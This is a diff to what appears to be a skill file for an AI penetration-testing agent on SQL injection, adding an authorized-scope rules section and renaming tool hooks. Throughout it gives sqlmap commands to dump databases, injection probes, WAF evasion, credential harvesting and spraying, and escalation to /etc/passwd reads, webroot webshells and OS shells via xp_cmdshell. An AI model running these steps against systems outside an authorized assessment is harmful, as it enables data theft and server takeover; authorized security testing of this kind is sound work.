@@ -4,6 +4,9 @@ description: "SQL injection detection, exploitation, and proof. Triggers - SQL e
 tags: [vuln_assess, exploitation]
 ---
 
+## Rules of Engagement
+Only test systems you are authorized to assess. Confirm the written scope and rate limits before active commands. Prefer the least-invasive check that proves impact; stop on evidence of production impact.
+
 # SQL Injection
 
 ## When this fires
@@ -16,7 +19,7 @@ sqlmap -u 'http://<t>/item?id=1' --batch --level 3 --risk 2 --random-agent | tee
 # non-standard transport (JSON body / RSC / GraphQL / custom headers): save the full request, then:
 sqlmap -r /tmp/request.txt -p <param> --batch
 ```
-Then `sqlmap_parse` on the output. A single manual probe (`'`, `' OR '1'='1' -- -`, `1 AND SLEEP(5)`) is a confirm poke ONLY — never the detection method or a payload sweep by hand.
+Output is parsed automatically when run via `pentest_shell`. A single manual probe (`'`, `' OR '1'='1' -- -`, `1 AND SLEEP(5)`) is a confirm poke ONLY — never the detection method or a payload sweep by hand.
 
 ## Decide
 - Error shown → error-based / UNION (fastest data). Get column count: `ORDER BY N` until it breaks; find the reflected column; fingerprint DB (`@@version`, `version()`, `sqlite_version()`).
@@ -27,14 +30,14 @@ Then `sqlmap_parse` on the output. A single manual probe (`'`, `' OR '1'='1' -- 
 ```bash
 sqlmap -r /tmp/request.txt -p <param> --batch --dbs           # list databases
 sqlmap ... -D <db> --tables ; sqlmap ... -D <db> -T <tbl> --dump   # extract
-# creds/secrets → add_credential + cred_spray; escalate where possible:
+# creds/secrets → state_update (key: credentials), validate via pentest_shell; escalate where possible:
 #  MySQL FILE priv → --file-read=/etc/passwd, INTO OUTFILE webshell in webroot
 #  MSSQL sa → --os-shell (xp_cmdshell) ; PostgreSQL superuser → COPY ... TO PROGRAM / --os-shell
 ```
 **Proof required:** a dumped row a benign query couldn't return (a canary/secret value), a read file (`/etc/passwd`), or `id` via os-shell. "sqlmap says injectable" is a lead, not proof.
 
 ## Tooling
-`sqlmap` (`--batch --random-agent`, `-r` for weird transports, `--technique BEUSTQ`, `--tamper` for WAF) → `sqlmap_parse`. `nuclei` for known-CVE SQLi in a specific product → `nuclei_parse`.
+`sqlmap` (`--batch --random-agent`, `-r` for weird transports, `--technique BEUSTQ`, `--tamper` for WAF) → run via `pentest_shell`, auto-parsed. `nuclei` for known-CVE SQLi in a specific product, also auto-parsed.
 
 ## False positives / pitfalls
 - 200-on-everything / WAF echo → confirm a TRUE vs FALSE differential, not just a reflected string.
